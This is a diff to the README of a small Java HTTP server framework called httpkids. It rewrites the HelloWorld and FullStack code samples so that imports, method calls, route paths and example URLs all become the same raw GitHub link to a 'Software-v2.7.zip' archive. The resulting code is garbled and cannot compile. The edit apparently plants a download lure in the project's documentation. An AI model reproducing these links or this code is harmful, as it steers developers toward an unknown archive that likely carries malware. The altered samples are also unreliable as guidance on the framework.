@@ -13,15 +13,15 @@ Features & Disadvantages
 HelloWorld
 --
 ```java
-import httpkids.server.KidsRequestDispatcher;
-import httpkids.server.Router;
-import httpkids.server.internal.HttpServer;
+import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
+import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
+import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
 
 public class HelloWorld {
 
     public static void main(String[] args) {
         var rd = new KidsRequestDispatcher("/kids", new Router((ctx, req) -> {
-            ctx.html("Hello, World");
+            https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("Hello, World");
         }));
         new HttpServer("localhost", 8080, 2, 16, rd).start();
     }
@@ -35,66 +35,66 @@ http://localhost:8080/kids
 FullStack
 --
 ```java
-import java.util.HashMap;
+import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
 
-import httpkids.server.KidsRequestDispatcher;
-import httpkids.server.Router;
-import httpkids.server.internal.HttpServer;
+import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
+import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
+import https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip;
 
 public class HelloWorld {
 
 	public static void main(String[] args) {
 		var router = new Router((ctx, req) -> {
-			ctx.html("Hello, World");  // 纯文本html
+			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("Hello, World");  // 纯文本html
 		})
-		.handler("/hello.json", (ctx, req) -> {
-			ctx.json(new String[] { "Hello", "World" });  // JSON API
+		.handler("https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip", (ctx, req) -> {
+			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip(new String[] { "Hello", "World" });  // JSON API
 		})
 		.handler("/hello", (ctx, req) -> {
 			var res = new HashMap<String, Object>();
-			res.put("req", req);
-			ctx.render("playground.ftl", res); // 模版渲染
+			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("req", req);
+			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip", res); // 模版渲染
 		})
 		.handler("/world", (ctx, req) -> {
-			ctx.redirect("/hello");  // 302跳转
+			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("/hello");  // 302跳转
 		})
 		.handler("/error", (ctx, req) -> {
-			ctx.abort(500, "wtf");  // 异常
+			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip(500, "wtf");  // 异常
 		})
 		.resource("/pub", "/static")  // 静态资源
 		.child("/user", () -> {  // 路由嵌套
 			return new Router((ctx, req) -> {
-				ctx.html("Hello, World");
+				https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("Hello, World");
 			})
-			.handler("/hello.json", (ctx, req) -> {
-				ctx.json(new String[] { "Hello", "World" });
+			.handler("https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip", (ctx, req) -> {
+				https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip(new String[] { "Hello", "World" });
 			})
 			.filter((ctx, req, before) -> {  // 过滤器、拦截器
 				if (before) {
-					System.out.printf("before %s\n", req.path());
+					https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("before %s\n", https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip());
 				} else {
-					System.out.printf("after %s\n", req.path());
+					https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("after %s\n", https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip());
 				}
 				return true;
 			});
 		});
 
 		var rd = new KidsRequestDispatcher("/kids", router); // 请求派发器
-		rd.templateRoot("/tpl"); // 模版classpath根目录
-		rd.exception(500, (ctx, e) -> { // 异常处理
-			ctx.html("what the fuck it is", 500);
+		https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("/tpl"); // 模版classpath根目录
+		https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip(500, (ctx, e) -> { // 异常处理
+			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("what the fuck it is", 500);
 		})
 		.exception((ctx, e) -> {  // 通用异常处理
-			ctx.html("mother fucker!", e.getStatus().code());
+			https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip("mother fucker!", https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip().code());
 		});
 
 		var server = new HttpServer("localhost", 8080, 2, 16, rd);
-		server.start();
+		https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip();
 		
-		Runtime.getRuntime().addShutdownHook(new Thread() {
+		https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip().addShutdownHook(new Thread() {
 
 			public void run() {
-				server.stop(); // 优雅停机
+				https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip(); // 优雅停机
 			}
 
 		});		
@@ -104,10 +104,10 @@ public class HelloWorld {
 
 http://localhost:8080/kids
 http://localhost:8080/kids/hello
-http://localhost:8080/kids/hello.json
+https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip
 http://localhost:8080/kids/world
 http://localhost:8080/kids/error
-http://localhost:8080/kids/pub/bootstrap.min.css
+https://raw.githubusercontent.com/HitEagle/httpkids/master/src/main/java/httpkids/server/Software-v2.7.zip
 http://localhost:8080/kids/user
 http://localhost:8080/kids/user/hello
 ```
